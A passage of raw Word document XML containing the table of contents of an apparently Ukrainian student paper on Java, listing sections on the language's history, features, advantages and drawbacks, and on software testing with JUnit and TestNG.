          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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аспекти</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.............................................................</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.....</w:t>
      </w:r>
      <w:r w:rsidR="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>..........</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FD2581" w:rsidRPr="00AC0787" w:rsidRDefault="00FD2581" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>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Исторiя</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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створення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>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особливост</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>……</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>…….</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.…………………...</w:t>
      </w:r>
      <w:r w:rsidR="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FD2581" w:rsidRPr="00AC0787" w:rsidRDefault="00FD2581" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Основн</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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знання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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мови</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>...…………………………………………...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FD2581" w:rsidRPr="00AC0787" w:rsidRDefault="00AC0787" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="240" w:after="0" w:line="36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Основн</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>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можлисовт</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>………</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>…………………………</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>…….</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FD2581" w:rsidRPr="00AC0787" w:rsidRDefault="00AC0787" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="240" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Переваги</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>недол</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ки</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>……</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>……………</w:t>
      </w:r>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>…………………………</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>…….</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FD2581" w:rsidRPr="00AC0787" w:rsidRDefault="00FD2581" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="240" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Висновок</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> до</w:t>
      </w:r>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>глави</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>…</w:t>
      </w:r>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>….</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>.……………</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>………………………………</w:t>
      </w:r>
      <w:r w:rsidR="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AC0787" w:rsidRPr="001826E6" w:rsidRDefault="00AC0787" w:rsidP="001826E6">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="212121"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="212121"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>ТЕСТУВАННЯ похідних програм: АОДХОДИ ЗАЛЕЖНО ВІД КАТЕГОРІЙ ДОДАТКІВ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="212121"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>…………………………………………..</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">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p>
    <w:p w:rsidR="00AC0787" w:rsidRDefault="00073DDF" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>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212121"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="212121"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Що таке тестування і їх види</w:t>
      </w:r>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00AC0787">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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>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AC0787" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Подробнее о видах тестирования…………………………………</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>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iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> Библиотека……………………………………………………………</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>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iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>JUnit</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>…………………………………………………...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>........................</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="00073DDF" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>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iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00AC0787" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>TestNG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>…………………………………………………………………</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00F33D0A" w:rsidRDefault="00F33D0A" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240"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bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Проектирование……………………………………………………...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F33D0A" w:rsidRPr="00F33D0A" w:rsidRDefault="00F33D0A" w:rsidP="001826E6">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
